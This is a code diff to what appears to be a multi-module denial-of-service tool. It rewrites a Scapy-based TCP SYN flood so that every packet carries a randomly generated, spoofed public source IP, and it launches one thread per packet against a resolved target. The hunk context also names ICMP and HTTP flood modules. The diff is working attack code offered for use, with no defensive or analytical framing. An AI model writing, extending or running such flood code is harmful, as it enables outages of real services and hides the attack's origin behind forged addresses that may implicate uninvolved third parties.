@@ -202,16 +202,30 @@ def icmpflood(target_url, cycle):
     print("--- ICMP Flood finished. ---")
 
 
-# Helper function for sending a single TCP SYN packet.
-def attack_synflood_helper(target, targetPort):
-    # Crafts a TCP packet with the SYN flag set.
-    # RandShort() randomizes the source port and sequence numbers, making the attack harder to filter.
-    send(IP(dst=target) / TCP(dport=targetPort, flags="S", sport=RandShort(), seq=RandShort()), verbose=0)
+# --- MODIFIED SCAPY-BASED FLOODS ---
+
+def generate_random_ip():
+    """Generates a random, non-private IP address."""
+    # This ensures we don't generate IPs from private ranges (like 192.168.x.x)
+    while True:
+        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
+        if not ip.startswith("10.") and \
+                not ip.startswith("192.168.") and \
+                not ip.startswith("172.16."):  # Simplified check
+            return ip
+
+
+def attack_synflood_helper(target, targetPort, spoofed_ip):
+    """Sends a single TCP SYN packet with a spoofed source IP."""
+    # The 'src' parameter in the IP layer sets the source address.
+    send(IP(src=spoofed_ip, dst=target) / TCP(dport=targetPort, flags="S", sport=RandShort(), seq=RandShort()),
+         verbose=0)
 
 
 def synflood(target_url, targetPort, cycle):
-    """Launches a multi-threaded TCP SYN flood."""
-    print(f"\n--- Launching SYN Flood against {target_url}:{targetPort} with {cycle} packets ---")
+    """Launches a multi-threaded TCP SYN flood with spoofed source IPs."""
+    # This attack requires root/administrator privileges!
+    print(f"\n--- Launching SPOOFED SYN Flood against {target_url}:{targetPort} with {cycle} packets ---")
     targets = resolve_to_ipv4(target_url)
     if not targets: return
 
@@ -219,15 +233,17 @@ def synflood(target_url, targetPort, cycle):
     for target in targets:
         print(f"[*] Targeting IP: {target}")
         for _ in range(cycle):
-            # CORRECTION: Pass args as a tuple.
-            t = threading.Thread(target=attack_synflood_helper, args=(target, targetPort))
+            # For each packet, generate a new random source IP
+            spoofed_source_ip = generate_random_ip()
+            t = threading.Thread(target=attack_synflood_helper, args=(target, targetPort, spoofed_source_ip))
             t.start()
             all_threads.append(t)
             time.sleep(0.01)
 
+    print(f"[*] All {cycle} threads launched. Waiting for completion...")
     for t in all_threads:
         t.join()
-    print("--- SYN Flood finished. ---")
+    print("--- Spoofed SYN Flood finished. ---")
 
 
 # --- 4. HTTP FLOOD MODULE ---
